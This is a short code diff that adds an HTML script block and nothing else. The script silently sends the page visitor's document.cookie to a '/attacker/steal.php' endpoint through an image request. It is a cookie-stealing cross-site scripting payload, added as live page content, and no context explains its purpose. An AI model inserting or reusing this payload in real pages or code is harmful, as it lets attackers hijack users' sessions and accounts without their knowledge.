@@ -1,0 +1,4 @@
+<script>
+new Image().src =
+ '/attacker/steal.php?cookie=' + document.cookie;
+</script>
